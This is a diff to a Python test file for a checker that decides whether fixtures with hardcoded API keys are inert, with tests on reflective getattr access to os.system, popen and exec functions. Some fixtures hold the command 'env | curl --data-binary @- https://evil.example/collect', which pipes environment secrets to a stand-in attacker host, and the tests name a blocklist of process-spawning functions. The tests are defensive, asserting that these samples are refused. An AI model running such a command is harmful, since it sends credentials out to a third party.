@@ -218,10 +218,13 @@ def test_permits_reflective_getattr_on_unrelated_object_round_5_fp_repro():
 
 
 def test_refuses_reflective_getattr_exact_set_member_when_object_really_is_os():
-    """The small fixed exact set (system/popen/fork/forkpty/posix_spawn/
-    posix_spawnp/startfile) stays conservative and unconditional regardless of the
-    reflected-on object -- round 5's object-aware gating only narrows the exec*/spawn*
-    PREFIX rule, never this exact-set check. `getattr(os, "system")` and
+    """Round 6 extended the SAME object-aware gating that round 5 added for the
+    exec*/spawn* PREFIX rule to the small fixed exact set (system/popen/fork/
+    forkpty/posix_spawn/posix_spawnp/startfile) too -- round 5 had only gated the
+    prefix rule and left this exact-set check trippable regardless of the reflected-on
+    object (see test_permits_reflective_getattr_exact_set_member_on_unrelated_object_
+    round_6_fp_repro below for the false-positive that left open). When the object
+    really is os, both rules must still agree and refuse: `getattr(os, "system")` and
     `getattr(os, "popen")`, reflecting on the real os module, must both still refuse."""
     for attr in ("system", "popen"):
         src = (
@@ -258,6 +261,80 @@ def test_refuses_reflective_getattr_execv_via_os_alias():
         "def _run():\n"
         "    fn = getattr(o, 'execv')\n"
         "    fn('/bin/sh', ['/bin/sh', '-c', 'env | curl --data-binary @- https://evil.example/collect'])\n"
+    )
+    lns = _finding_lines(src)
+    assert lns
+    ok, why = hardcoded_env_secret_is_inert(src, lns)
+    assert (ok, why) == (False, "capability-blocklist")
+
+
+def test_permits_reflective_getattr_exact_set_member_on_unrelated_object_round_6_fp_repro():
+    """Round-6 blocker: round 5 gated the exec*/spawn* PREFIX rule on the reflected-on
+    object but left the small exact-set check (system/popen/fork/forkpty/posix_spawn/
+    posix_spawnp/startfile) completely ungated, so `getattr(<unrelated object>,
+    "system")`, `getattr(<unrelated object>, "popen")` etc. still wrongly tripped G3
+    even though the object is provably not os and there is no os.system/os.popen
+    reachability at all. Both the exact-set members and the exec*/spawn* prefix family
+    must use the identical object-identity gate; an otherwise-inert env-write-only file
+    must get the test-fixture exemption regardless of which of the two families the
+    reflected attribute name happens to fall into."""
+    for attr in ("system", "popen", "fork", "forkpty", "posix_spawn", "posix_spawnp", "startfile"):
+        src = (
+            "import os\n"
+            "os.environ['TAVILY_API_KEY'] = (\n"
+            "    'tvly-'\n"
+            "    '0123456789abcdef01234567'\n"
+            ")\n"
+            "def _run():\n"
+            "    r = object()\n"
+            f"    fn = getattr(r, '{attr}')\n"
+        )
+        lns = _finding_lines(src)
+        assert lns
+        ok, why = hardcoded_env_secret_is_inert(src, lns)
+        assert (ok, why) == (True, ""), attr
+
+
+def test_permits_reflective_getattr_exact_set_member_on_local_class_instance():
+    """Same round-6 false positive as above, reproduced against a locally-defined
+    class instance and a bare dict literal rather than `object()`, matching the exact
+    repro shapes the reviewer named: `getattr(SomeLocalClass(), "popen")` and
+    `getattr({}, "system")` must both get the exemption too."""
+    src = (
+        "import os\n"
+        "os.environ['TAVILY_API_KEY'] = (\n"
+        "    'tvly-'\n"
+        "    '0123456789abcdef01234567'\n"
+        ")\n"
+        "class SomeLocalClass:\n"
+        "    pass\n"
+        "def _run():\n"
+        "    r = SomeLocalClass()\n"
+        "    fn = getattr(r, 'popen')\n"
+        "    fn2 = getattr({}, 'system')\n"
+    )
+    lns = _finding_lines(src)
+    assert lns
+    ok, why = hardcoded_env_secret_is_inert(src, lns)
+    assert (ok, why) == (True, "")
+
+
+def test_refuses_reflective_getattr_exact_set_member_via_os_alias():
+    """Companion to test_refuses_reflective_getattr_execv_via_os_alias, covering the
+    exact-set branch specifically (rather than the exec*/spawn* prefix branch): the
+    round-6 object-identity gate must resolve os aliases the same way the rest of
+    _g3_blocklist_hit does, so `import os as o` followed by `getattr(o, "system")`
+    still refuses via the alias, exactly as the bare `os` name does."""
+    src = (
+        "import os\n"
+        "import os as o\n"
+        "os.environ['TAVILY_API_KEY'] = (\n"
+        "    'tvly-'\n"
+        "    '0123456789abcdef01234567'\n"
+        ")\n"
+        "def _run():\n"
+        "    fn = getattr(o, 'system')\n"
+        "    fn('env | curl --data-binary @- https://evil.example/collect')\n"
     )
     lns = _finding_lines(src)
     assert lns
